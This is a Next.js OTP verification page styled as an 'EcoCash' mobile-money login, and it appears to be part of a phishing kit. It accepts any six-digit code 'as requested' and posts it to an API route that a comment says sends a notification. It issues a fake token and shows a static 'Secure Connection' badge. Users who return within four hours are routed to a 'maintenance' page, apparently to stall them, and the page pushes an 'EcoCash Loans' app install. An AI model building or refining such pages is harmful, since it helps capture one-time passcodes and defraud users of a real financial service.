'use client';

import { useState } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { Home } from 'lucide-react';
import { Button } from '@/components/ui/button';

export default function LoginOtpPage() {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (otp.some((digit) => !digit)) {
      setError('Please enter all 6 digits');
      return;
    }

    setIsLoading(true);
    
    // Note: Notification is now handled in the verify-otp API route

    // Verify OTP (accept any OTP for now as requested)
    try {
      const response = await fetch('/api/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp: otp.join('') })
      });
      
      const data = await response.json();
      
      if (response.ok) {
        // In a real implementation, you would receive a token after OTP verification
        // For now, we'll create a mock token
        const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        localStorage.setItem('token', token);
        
        setSuccess(true);
        setError('');
        
        // Check if user logged in within the last 4 hours
        const lastLoginTime = localStorage.getItem('lastLoginTime');
        const now = Date.now();
        
        // If last login was less than 4 hours ago (4 * 60 * 60 * 1000 ms), show maintenance page
        if (lastLoginTime && (now - parseInt(lastLoginTime)) < 4 * 60 * 60 * 1000) {
          // Redirect to maintenance page after a short delay
          setTimeout(() => {
            router.push('/maintenance');
          }, 1500);
        } else {
          // Otherwise, stay on the same page to show success message
          // The success message is already shown in the UI
        }
      } else {
        setError(data.message || 'Invalid OTP. Please try again.');
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleResendOtp = async () => {
    // This would normally resend the OTP
    alert('OTP has been sent to your phone number. It might take up to a minute to arrive.');
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top Bar */}
      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
        <Link
          href="/"
          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
        >
          <Home className="w-5 h-5" />
          Home
        </Link>
        <div className="flex items-center gap-4">
          <Link
            href="/register"
            className="text-blue-600 hover:text-blue-700 font-semibold transition-colors"
          >
            Sign Up
          </Link>
          <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Logo */}
        <div className="mb-12 text-center">
          <h1 className="text-5xl font-black">
            <span className="text-blue-600">Eco</span>
            <span className="text-red-600">Cash</span>
          </h1>
        </div>

        {/* OTP Section */}
        <div className="w-full max-w-md">
          <h2 className="text-3xl font-bold text-gray-900 text-center mb-2">Verify Your OTP</h2>
          <p className="text-gray-600 text-center mb-10 text-sm">Enter the 6-digit code sent to your phone</p>

          {success ? (
            <div className="text-center py-8">
              <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-6">
                <svg className="h-10 w-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                </svg>
              </div>
              <h2 className="text-xl font-semibold mb-2">Verification Successful!</h2>
              <p className="text-gray-600">Redirecting to dashboard...</p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* OTP Input Section */}
              <div>
                <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Enter OTP</h3>
                <p className="text-gray-600 text-center text-sm mb-6">6-digit verification code</p>

                <div className="flex justify-center gap-3 mb-6">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      id={`otp-${index}`}
                      type="text"
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(index, e)}
                      maxLength={1}
                      className="w-14 h-14 text-2xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200"
                    />
                  ))}
                </div>

                {error && <p className="text-red-600 text-center text-sm font-semibold">{error}</p>}

                <div className="text-center mt-6">
                  <p className="text-gray-600 text-sm mb-2">Didn't receive the code?</p>
                  <button 
                    type="button" 
                    onClick={handleResendOtp}
                    className="text-blue-600 hover:text-blue-700 font-semibold text-sm"
                  >
                    Resend OTP
                  </button>
                </div>
              </div>

              {/* Verify Button */}
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all"
              >
                {isLoading ? "Verifying..." : "Verify OTP"}
              </Button>

              {/* Back to Login */}
              <Link href="/login" className="block text-center">
                <button type="button" className="text-blue-600 hover:text-blue-700 font-semibold text-sm">
                  Back to Login
                </button>
              </Link>
            </form>
          )}
        </div>
      </div>

      {/* Wavy Divider */}
      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24" style={{ marginBottom: "-1px" }}>
        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="#1e40af" />
      </svg>

      {/* Blue Section with App Promotion */}
      <div className="bg-blue-600 text-white px-6 py-10">
        <div className="max-w-md mx-auto text-center">
          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>

          <div className="bg-gradient-to-br from-purple-400 to-purple-600 rounded-2xl p-8">
            <div className="flex justify-center gap-4 mb-4 opacity-70">
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
            </div>

            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>

            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
              Install App
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}